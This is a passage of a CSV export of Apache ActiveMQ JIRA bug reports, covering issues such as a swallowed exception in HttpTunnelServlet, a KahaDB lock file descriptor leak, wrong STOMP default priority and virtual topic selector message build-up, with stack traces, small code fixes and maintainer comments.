HttpTunnelServlet incorrectly swallows exceptions during transport creation.,AMQ-3012,12483831,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,stirlingc,stirlingc,02/Nov/10 20:53,20/Sep/11 10:42,14/Jul/23 05:43,06/Jul/11 23:07,5.4.1,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"Symptom
=======
org.apache.activemq.transport.http.HttpTunnelServlet.java contains the following logic:

    protected BlockingQueueTransport createTransportChannel(HttpServletRequest request, HttpServletResponse response) throws IOException {
...
            clients.put(clientID, answer);
            Transport transport = answer;
            try {
                HashMap options = new HashMap(transportOptions);
                transport = transportFactory.serverConfigure(answer, null, options);
            } catch (Exception e) {
               IOExceptionSupport.create(e);
            }

If the call to transportFactory.serverConfigure(...) throws an exception, IOExceptionSupport.create(e) is called, which wraps the exception in an IOException, but that IOException is never thrown.

Solution
=======
See attached patch file.  Add a ""throw"" clause to propagate the IOException.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Nov/10 20:53;stirlingc;patch.txt;https://issues.apache.org/jira/secure/attachment/12461828/patch.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60103,,,Wed Jul 06 23:07:31 UTC 2011,,,,,,,Patch Available,,,,"0|i0akaf:",59560,,,,,,,,,,,,,,,,,,,,,"02/Nov/10 20:53;stirlingc;Patch for HttpTunnelServlet.java;;;","06/Jul/11 23:07;tabish;Patch applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Queue destination bridge does not stay up,AMQ-3008,12483826,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,treyhyde,treyhyde,29/Oct/10 20:49,04/Feb/12 22:12,14/Jul/23 05:43,04/Feb/12 22:12,5.3.2,5.4.1,,,,5.6.0,,,,,,,0,,,,,,,,,"I'm not sure of cause of any of these exceptions.  The IllegalStateException seems be be due to the direct interaction between the OpenMQ and ActiveMQ jms code.   I haven't the faintest why the reconnect code can't connect again in the normal circumstance.  The agents that talk directly to OpenMQ do no have issues during these times and nothing is logged in the OpenMQ log.


2010-10-29 10:54:44,170 | ERROR | failed to forward message on attempt: 1 reason: javax.jms.IllegalStateException: [C4064]: Cannot perform operation, producer is closed. message: ActiveMQMapMessage {commandId = 3, responseRequired = false, messageId = ID:mq1.cdlocal-27338-12
88370972745-6:24434:-1:1:1, originalDestination = null, originalTransactionId = null, producerId = ID:mq1.cdlocal-27338-1288370972745-6:24434:-1:1, destination = queue://CD.live.search.needsretrieve, transactionId = null, expiration = 0, timestamp = 1288374884167, arrival = 
0, brokerInTime = 1288374884167, brokerOutTime = 1288374884167, correlationId = null, replyTo = null, persistent = true, type = null, priority = 0, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.ut
il.ByteSequence@224f68dc, marshalledProperties = org.apache.activemq.util.ByteSequence@b6d551d, dataStructure = null, redeliveryCounter = 0, size = 1797, properties = {transformation=jms-map-json}, readOnlyProperties = true, readOnlyBody = true, droppable = false} ActiveMQMa
pMessage{ theTable = {} } | org.apache.activemq.network.jms.DestinationBridge | ActiveMQ Session: ID:mq1.cdlocal-27338-1288370972745-4:0:2
javax.jms.IllegalStateException: [C4064]: Cannot perform operation, producer is closed.
        at com.sun.messaging.jmq.jmsclient.MessageProducerImpl.checkState(MessageProducerImpl.java:175)
        at com.sun.messaging.jmq.jmsclient.MessageProducerImpl.send(MessageProducerImpl.java:719)
        at com.sun.messaging.jmq.jmsclient.QueueSenderImpl.send(QueueSenderImpl.java:145)
        at org.apache.activemq.network.jms.QueueBridge.sendMessage(QueueBridge.java:80)
        at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:129)
        at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1229)
        at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:134)
        at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:205)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
2010-10-29 10:54:45,179 | ERROR | failed to forward message on attempt: 2 reason: com.sun.messaging.jms.JMSException: [C4003]: Error occurred on connection creation [search2.cdlocal:6076]. - cause: java.net.ConnectException: Connection refused message: ActiveMQMapMessage {co
mmandId = 3, responseRequired = false, messageId = ID:mq1.cdlocal-27338-1288370972745-6:24434:-1:1:1, originalDestination = null, originalTransactionId = null, producerId = ID:mq1.cdlocal-27338-1288370972745-6:24434:-1:1, destination = queue://CD.live.search.needsretrieve, t
ransactionId = null, expiration = 0, timestamp = 1288374884167, arrival = 0, brokerInTime = 1288374884167, brokerOutTime = 1288374884167, correlationId = null, replyTo = null, persistent = true, type = null, priority = 0, groupID = null, groupSequence = 0, targetConsumerId =
 null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@224f68dc, marshalledProperties = org.apache.activemq.util.ByteSequence@b6d551d, dataStructure = null, redeliveryCounter = 0, size = 1797, properties = {transformation=jms-map-json}, rea
dOnlyProperties = true, readOnlyBody = true, droppable = false} ActiveMQMapMessage{ theTable = {} } | org.apache.activemq.network.jms.DestinationBridge | ActiveMQ Session: ID:mq1.cdlocal-27338-1288370972745-4:0:2
com.sun.messaging.jms.JMSException: [C4003]: Error occurred on connection creation [search2.cdlocal:6076]. - cause: java.net.ConnectException: Connection refused
        at com.sun.messaging.jmq.jmsclient.ExceptionHandler.throwConnectionException(ExceptionHandler.java:274)
        at com.sun.messaging.jmq.jmsclient.ExceptionHandler.handleConnectException(ExceptionHandler.java:220)
        at com.sun.messaging.jmq.jmsclient.PortMapperClient.readBrokerPorts(PortMapperClient.java:241)
        at com.sun.messaging.jmq.jmsclient.PortMapperClient.init(PortMapperClient.java:150)
        at com.sun.messaging.jmq.jmsclient.PortMapperClient.<init>(PortMapperClient.java:92)
        at com.sun.messaging.jmq.jmsclient.protocol.tcp.TCPConnectionHandler.<init>(TCPConnectionHandler.java:164)
        at com.sun.messaging.jmq.jmsclient.protocol.tcp.TCPStreamHandler.openConnection(TCPStreamHandler.java:135)
        at com.sun.messaging.jmq.jmsclient.ConnectionInitiator.createConnection(ConnectionInitiator.java:778)
        at com.sun.messaging.jmq.jmsclient.ConnectionInitiator.createConnectionNew(ConnectionInitiator.java:254)
        at com.sun.messaging.jmq.jmsclient.ConnectionInitiator.createConnection(ConnectionInitiator.java:208)
        at com.sun.messaging.jmq.jmsclient.ConnectionInitiator.createConnection(ConnectionInitiator.java:158)
        at com.sun.messaging.jmq.jmsclient.ProtocolHandler.init(ProtocolHandler.java:816)
        at com.sun.messaging.jmq.jmsclient.ProtocolHandler.<init>(ProtocolHandler.java:1529)
        at com.sun.messaging.jmq.jmsclient.ConnectionImpl.openConnection(ConnectionImpl.java:2327)
        at com.sun.messaging.jmq.jmsclient.ConnectionImpl.init(ConnectionImpl.java:1024)
        at com.sun.messaging.jmq.jmsclient.ConnectionImpl.<init>(ConnectionImpl.java:418)
        at com.sun.messaging.jmq.jmsclient.UnifiedConnectionImpl.<init>(UnifiedConnectionImpl.java:60)
        at com.sun.messaging.jmq.jmsclient.QueueConnectionImpl.<init>(QueueConnectionImpl.java:59)
        at com.sun.messaging.ConnectionFactory.createQueueConnection(ConnectionFactory.java:98)
        at com.sun.messaging.ConnectionFactory.createQueueConnection(ConnectionFactory.java:83)
        at com.centraldesktop.mq.openmq.QueueConnectionFactory.createQueueConnection(QueueConnectionFactory.java:33)
        at org.apache.activemq.network.jms.JmsQueueConnector.initializeForeignQueueConnection(JmsQueueConnector.java:223)
        at org.apache.activemq.network.jms.JmsQueueConnector.restartProducerConnection(JmsQueueConnector.java:184)
        at org.apache.activemq.network.jms.DestinationBridge.restartProducer(DestinationBridge.java:177)
        at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:115)
        at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1229)
        at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:134)
        at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:205)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
Caused by: java.net.ConnectException: Connection refused
        at java.net.PlainSocketImpl.socketConnect(Native Method)
        at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:310)
        at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:176)
        at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:163)
        at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:381)
        at java.net.Socket.connect(Socket.java:537)
        at java.net.Socket.connect(Socket.java:487)
        at java.net.Socket.<init>(Socket.java:384)
        at java.net.Socket.<init>(Socket.java:198)
        at com.sun.messaging.jmq.jmsclient.PortMapperClient.makeSocketWithTimeout(PortMapperClient.java:268)
        at com.sun.messaging.jmq.jmsclient.PortMapperClient.readBrokerPorts(PortMapperClient.java:220)
        ... 27 more


this exception repeats 10 times IMMEDIATELY and no further attempts are made at reconnecting.   A restart of ActiveMQ reestablishes the bridge.

Code and configuration for the AMQ->IMQ bridge is available here: http://github.com/centraldesktop/openmq-spring-bean

This has to be somewhat related to AMQ-2455 which I was told may resolve this issue (it didn't).
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,43768,,,Sat Feb 04 22:12:27 UTC 2012,,,,,,,,,,,"0|i0akan:",59561,,,,,,,,,,,,,,,,,,,,,"04/Feb/12 22:12;tabish;Fixed by latest changes made for AMQ-2455;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Kahadb LockFile.lock() leaks file descriptors if tryLock() returns an IOException,AMQ-3007,12483828,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,marcuss,marcuss,28/Oct/10 22:45,29/Oct/10 08:00,14/Jul/23 05:43,29/Oct/10 08:00,5.3.2,5.4.0,5.4.1,,,5.4.2,,,Message Store,,,,0,,,,,,,,,"The slave will output these messages:

INFO | Database /mnt/activemqdata/lock is locked... waiting 10 seconds for the database to be unlocked ......

After awhile, the messages change to:

INFO | Database /mnt/activemqdata/lock is locked... waiting 10 seconds for the database to be unlocked. Reason: java.io.FileNotFoundException: /mnt/activemq/lock (Too many open files) ....

Upon inspection of LockFile.lock(), OverlappingFileLockException is the only exception caught.  In the event tryLock() throws IOException, as it does in
my case, the readFile isn't cleaned up and the caller (which catches IOExceptions), just iterates again.

Since javadoc says FileChannel.tryLock() throws an IOException, and the caller in this case, and MessageDatabase expects to catch IOExceptions, it
would seem like adding this to the code in LockFile.lock() should fix this issue.

catch (IOException e)
{
    reason = e;
}


","Ubuntu Linux, activemq 5.3.2, master slave configuration with kahadb configured directory on a smb mount.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14740,,,Fri Oct 29 08:00:11 UTC 2010,,,,,,,,,,,"0|i0b9of:",63680,,,,,,,,,,,,,,,,,,,,,"29/Oct/10 08:00;gtully;fix applied with thanks to r1028637.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP connector assigns wrong default priority to incoming messages,AMQ-3006,12483822,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,mjustin,mjustin,28/Oct/10 18:11,16/Feb/11 22:55,14/Jul/23 05:43,16/Feb/11 22:55,5.4.1,,,,,5.5.0,,,Transport,,,,0,,,,,,,,,"If a client sends a Stomp frame without a priority header, the broker does not set the message priority to the default value (4) which is specified in the JMS spec (see http://download.oracle.com/javaee/1.4/api/javax/jms/Message.html: DEFAULT_PRIORITY The message producer's default priority is 4.) 

As effect, the message will have priority 0 (lowest).

Adding a priority header for all messages by the Stomp client, even for default priority, would also cause larger messages to be sent over the wire.

",Windows Vista,mjustin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14688,,,Wed Feb 16 22:55:20 UTC 2011,,,,,,,,,,,"0|i0akav:",59562,,,,,,,,,,,,,,,,,,,,,"16/Feb/11 22:55;tabish;Applied fix in trunk to properly set default priority if one isn't set on the message.

Created a test to ensure it stays fixed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The spring.schemas file contains an invalid mapping ,AMQ-3005,12483815,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,mmonette,mmonette,27/Oct/10 15:37,28/Oct/10 13:27,14/Jul/23 05:43,28/Oct/10 13:27,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"The spring.schemas file, in META-INF, contains the following mappings:

http\://activemq.org/config/1.0=activemq.xsd
http\://activemq.org/config/1.0/1.0.xsd=activemq.xsd
http\://activemq.apache.org/schema/core=activemq.xsd
http\://activemq.apache.org/schema/core/activemq-core.xsd=activemq.xsd
http\://activemq.apache.org/schema/core/activemq-core-5.0.0.xsd=activemq.xsd
http\://activemq.apache.org/schema/core/activemq-core-5.1.0.xsd=activemq.xsd
http\://activemq.apache.org/schema/core/activemq-core-5.2.0.xsd=activemq.xsd
http\://activemq.apache.org/schema/core/activemq-core-5.3.0.xsd=activemq.xsd
http\://activemq.apache.org/schema/core/activemq-core-${pom.version}.xsd=activemq.xsd

The final mapping contains an unresolved placeholder, ${pom.version}.  XML files which use, for example http://activemq.apache.org/schema/core/activemq-core-5.4.1.xsd as a schemaLocation reference will fail to be mapped correctly with the spring.schemas mechanism.  This failure is silent on an internet-connected machine which is allowed to resolve the schemaLocation through the http:// url.  When the machine is not internet-connected, though, the failure rears its ugly head and smacks down hard on my webapp's startup with a SAXParseException.",,mmonette,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14761,,,Thu Oct 28 13:27:26 UTC 2010,,,,,,,,,,,"0|i0b9qf:",63689,,,,,,,,,,,,,,,,,,,,,"28/Oct/10 13:11;gtully;The lack of filtering must be the result of a change to the resources plugin or the apache parent pom. In any event, just filtering the current version does not give us what we want for backward compatibility. We want all previous versions referenced so that existing schema references will still work. 

This is tricky to automate as it requires a commit and part of the pre release process. For the moment it may just be best to add the current and a set of future versions and note that it needs to be checked before doing a release.;;;","28/Oct/10 13:27;gtully;updated the file and added a few past and future versions. Added note to the release guide to ensure it is not missed in the future: http://activemq.apache.org/release-guide.html;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Build-up of unwanted messages,AMQ-3004,12483852,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,rnaude,rnaude,27/Oct/10 13:00,15/Apr/12 10:38,14/Jul/23 05:43,15/Apr/12 10:38,5.4.1,,,,,5.6.0,,,Broker,,,,1,,,,,,,,,"One of our installations have several consumers. These consumers subscribe for messages from a queue linked to a virtual topic. All consumers supply a selector. Some consumers connect, process any persisted messages, then disconnect. These connect/disconnect cycles are repeated a few times a day.

What we've seen is that messages build-up for consumers. These messages does not match the supplied selector. The side effect of this was that we ran into a situation whereby message ""got stuck"". Increasing the _maxPageSize_ property helped. This is unfortunately a short term solution.

A simple test was constructed whereby *selectorAware* was set to *true*:
{code:xml}
<virtualDestinations>
  <virtualTopic name=""VirtualTopic.>"" prefix=""Consumer.*."" selectorAware=""true""/>
</virtualDestinations>
{code}

What we noticed is that:
# Messages are correctly received by a connected consumer
# A consumer that connects, disconnects and re-connects later will loose any messages that were send in the time period it was disconnected.

This behaviour was unexpected. From the AMQ documention (http://activemq.apache.org/virtual-destinations.html):
{quote}
From version 5.4, dispatch from virtual topics to subscription queues can be selectorAware such that only messages that match one of the existing subscribers are actually dispatched. Using this option prevents the build up of unmatched messages when selectors are used by exclusive consumers
{quote}

Note: it does not state that the consumer needs to be connected for this feature to work.

Given the test it looks like subscriptions itself are not persisted, thus the AMQ broker has no idea that it should enqueue a message for a particular subscription queue.

Would it be possible to add either of:
# Persist subscription detail, specifically for the case where the subscription's selector should be applied to the subscription queue
# Propagate selectors and the attached  subscription queue to the top-level virtual topic so that only interested messages can be delivered to the intended recipient?

Anything else we can try, supply or help with?",,rnaude,tkarakai,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Nov/10 11:58;rnaude;AMQ-3004.patch;https://issues.apache.org/jira/secure/attachment/12461816/AMQ-3004.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,59926,,,Sun Apr 15 10:38:09 UTC 2012,,,,,,,,,,,"0|i0akb3:",59563,,,,,,,,,,,,,,,,,,,,,"04/Nov/10 11:58;rnaude;The attached patch solves the issue for the most part. Consumers need to connect at least once for the selector to be cached. The cached selector will be persisted to the configured file every 10min. It is re-loaded during startup.

{code:xml}
<broker>
.
.
.
   <plugins>
      <spring:ref local=""subQueueSelectorCacheBroker""/>
    </plugins>
.
.
.
</broker>

<spring:bean id=""subQueueSelectorCacheBroker"" class=""org.apache.activemq.plugin.SubQueueSelectorCacheBrokerPlugin"">
    <spring:property name=""persistFile"" value=""file:${jboss.server.data.dir}/activemq/selectorCache.dat""/>
 </spring:bean>
{code}
;;;","16/Sep/11 23:52;tkarakai;We would very much like to get this patch into the trunk!

Virtual Topics are a perfect match for our use case, we have a single selector per queue (multiple consumers but each using the same selector on a given queue), and need to guarantee that the (filtered) messages are delivered to each queue even when all the consumers disconnect (in our case not intentionally, just dues to some failure or networking issue) and it's not acceptable to miss messages that were published during a disconnect.

Any chance that this solution or a comparable one will make it to an an official release?
;;;","20/Sep/11 10:23;gtully;lets try and get to this for 5.6;;;","21/Sep/11 14:24;gtully;@Takar
Roelof's patch looks very good and is mostly unobtrusive. 
For your use case though I think it only kicks in if all subscriptions are disconnected, which may not be what you want.

It also needs a junit test case to validate and protect it.
Maybe you can provide the required test case and some update that will make it work for you?;;;","27/Oct/11 16:32;tabish;Would be great if we could get a JUnit test case for this to help determine what the best fix is.;;;","15/Apr/12 10:38;rajdavies;Submitted patch - and other bits a pieces -
Can use the persistent cache as a broker plugin - 
e.g.

<plugins>
 <virtualSelectorCacheBrokerPlugin persistFile =""selectorcache.data""/>
</plugins>;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Multiple Cron Scheduled Messages don't fire every minute as configured,AMQ-3000,12483794,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tb0ne,tb0ne,26/Oct/10 20:01,15/Feb/11 23:47,14/Jul/23 05:43,15/Feb/11 23:47,5.4.1,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"I ran into a scenario where I have multiple Scheduled Messages with a cron string set to fire every minute that are created at different times.  However, only one is firing every minute (cycles 0 to 9).  I will attach a test Case that could be incorporated into org.apache.activemq.broker.scheduler.JmsSchedulerTest",Ubuntu Lucid and Windows 2k8,moczarski,tb0ne,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Oct/10 20:05;tb0ne;JmsCronSchedulerTest.java;https://issues.apache.org/jira/secure/attachment/12461847/JmsCronSchedulerTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14685,,,Tue Feb 15 23:47:20 UTC 2011,,,,,,,,,,,"0|i0akbj:",59565,,,,,,,,,,,,,,,,,,,,,"26/Oct/10 20:05;tb0ne;This is a standalone JUnit test.  The test method in this could be incorporated into activemq-core/src/test/java/org/apache/activemq/broker/scheduler/JmsSchedulerTest.java without modification.;;;","15/Feb/11 23:47;tabish;Fixed in trunk.  Thanks for the great test.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
peer transport factory mapping localhost incorrectly to loopback,AMQ-2999,12483798,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,petri.riipinen,petri.riipinen,26/Oct/10 10:35,27/Oct/10 06:47,14/Jul/23 05:43,26/Oct/10 11:04,5.3.2,5.4.0,5.4.1,,,5.4.2,,,,,,,0,,,,,,,,,"Issue described in the first posting of that thread: http://activemq.2283324.n4.nabble.com/Problem-with-simple-peer-configuration-my-config-or-AMQ-issue-td3013268.html#a3013268

Reply from Gary Tully explains the problem: ""That looks like a bug in the peer transport factory. I uses localhost:0 as the tcp transport url, but localhost maps to the 
loopback address since 5.3[1] so the connection is refused. The peer transport factory should use the wildcard address, 0.0.0.0""","Windows XP 32-bit, SUN JDK 1.6 update 21",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14845,,,Wed Oct 27 06:47:12 UTC 2010,,,,,,,,,,,"0|i0b9r3:",63692,,,,,,,,,,,,,,,,,,,,,"26/Oct/10 11:04;gtully;resolved in 1027461, wildcard address is now used for the tcp transport. If necessary we can make this configurable.;;;","27/Oct/10 06:47;petri.riipinen;Tested on 27/Oct/10 by original reporter and works now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Virtual topic interceptor process advisory messages,AMQ-2993,12483528,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,21/Oct/10 09:25,21/Oct/10 09:37,14/Jul/23 05:43,21/Oct/10 09:37,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,This can cause all sorts of trouble (including forwarding ConsumerInfo to the consumer) in networked environment.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14836,,,Thu Oct 21 09:37:12 UTC 2010,,,,,,,,,,,"0|i0b9s7:",63697,,,,,,,,,,,,,,,,,,,,,"21/Oct/10 09:37;dejanb;Fixed in svn revision 1025905;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
StorePercentUsage is not refreshed when retrieved over JMX,AMQ-2986,12483506,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,18/Oct/10 13:37,18/Oct/10 13:40,14/Jul/23 05:43,18/Oct/10 13:40,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"Even if the usage is calculated appropriately, the value displayed in JConsole is cached and not calculated on every call, so you can get impression that it's not updated.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14839,,,Mon Oct 18 13:40:06 UTC 2010,,,,,,,,,,,"0|i0b9rj:",63694,,,,,,,,,,,,,,,,,,,,,"18/Oct/10 13:40;dejanb;fixed with svn revision 1023795;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missing messages in durable subscription with selector and KahaDB,AMQ-2985,12483454,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,18/Oct/10 09:22,23/Nov/10 19:22,14/Jul/23 05:43,23/Nov/10 19:22,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"With a selector and reconnecting durable sub, some messages appear missing as if they were acked in 